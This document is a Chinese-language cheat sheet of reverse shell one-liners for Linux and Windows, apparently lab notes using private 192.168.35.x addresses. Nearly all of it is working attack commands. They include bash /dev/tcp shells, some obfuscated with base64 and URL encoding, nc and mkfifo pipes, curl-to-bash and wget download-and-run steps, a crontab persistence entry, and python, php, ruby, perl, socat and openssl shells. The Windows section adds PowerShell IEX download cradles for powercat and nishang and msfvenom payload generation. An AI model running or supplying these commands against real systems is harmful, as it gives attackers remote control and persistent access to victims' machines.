# 反弹Shell-Linux

```bash
【监听端】centos: 192.168.35.152
【被控端】kali: 192.168.35.128
    
# 监听端执行
[root@localhost ~]# nc -vvl 7777
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
```

## bash

```python
┌──(root@kali)-[/home/kali]
└─# bash -i >& /dev/tcp/192.168.35.152/7777 0>&1     # 执行失败                                   
zsh: 没有那个文件或目录: /dev/tcp/192.168.35.152/7777 
```

## bash base64

```bash
# /bin/bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
bash -c '{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==}|{base64,-d}|{bash,-i}'
```

## bash base64 URLencode

```bash
# /bin/bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
bash -c '{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA%3D%3D}|{base64,-d}|{bash,-i}'
```

## nc

```bash
nc -e /bin/bash 192.168.35.152 7777
mknod backpipe p && nc 192.168.35.152 7777 0<backpipe | /bin/bash 1>backpipe 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.35.152 7777 >/tmp/f
```

```
nc -lvnp 8000 -e /bin/bash
```
## ncat

```bash
ncat  192.168.35.152 7777 -e /bin/bash
ncat --udp 192.168.35.152 7777 -e /bin/bash
```

## curl

攻击方：

```bash
cat bash.html
/bin/bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
```

被控端：

```
curl 192.168.35.152/bash.html|bash
```

## http

攻击方：

```bash
# 编写shell脚本并启动http服务器
echo "bash -i >& /dev/tcp/192.168.35.152/7777 0>&1" > shell.sh
python2环境下：python -m SimpleHTTPServer 80
python3环境下：python -m http.server 80
```

被控端：

```bash
# 上传shell.sh文件
wget 192.168.35.152/shell.sh
# 执行shell.sh文件
bash shell.sh
```

## crontab

```bash
* * * * * root bash -i >& /dev/tcp/192.168.35.152/7777  0>&1
```

## whois

```bash
# 只能执行指定命令，如pwd命令
whois -h 192.168.35.152 -p 7777 `pwd` 
```

## python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.35.152",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## php

```bash
php -r '$sock=fsockopen("192.168.35.152",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("192.168.35.152",7777).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'  # 执行失败
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.35.152","7777");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## socat

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.35.152:7777
```

## perl

```bash
perl -e 'use Socket;$i="192.168.35.152";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## php

```bash
php -r '$sock=fsockopen("192.168.35.152",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## openssl

```bash
# 监听端
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 7777
# or
ncat --ssl -vv -l -p 7777

# 受控端
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.35.152:7777 > /tmp/s; rm /tmp/s
```

# 反弹Shell-Windows

- Windows下的反弹shell仅测试了nc，执行成功。

```bash
【监听端】centos: 192.168.35.152
【被控端】windows: 192.168.35.1
    
# 监听端执行
[root@localhost ~]# nc -vvl 7777
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
```

## powercat

项目地址：https://github.com/besimorhino/powercat

```bash
System.Net.Webclient.DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.35.152 -p 7777 -e cmd
```

## nc

```bash
nc 192.168.35.152 7777 -e c:\windows\system32\cmd.exe
```

## nishang

Nishang是一个基于PowerShell的攻击框架，整合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。

项目地址：https://github.com/samratashok/nishang

```bash
# 将nishang下载到攻击者本地，在目标机使用powershell执行以下命令
IEX (New-Object Net.WebClient).DownloadString('http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.35.152 -port 7777
```

## Reverse UDP shell

```bash
IEX (New-Object Net.WebClient).DownloadString('http://192.168.35.152/nishang/Shells/Invoke-PowerShellUdp.ps1');

Invoke-PowerShellUdp -Reverse -IPAddress 192.168.35.152 -port 7777
```

## MSF

```bash
# 找出各类反弹一句话payload的路径信息
msfvenom -l payloads | grep 'cmd/windows/reverse'

# 生成反弹shell，复制粘贴到靶机上运行
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.35.152 LPORT=7777
```

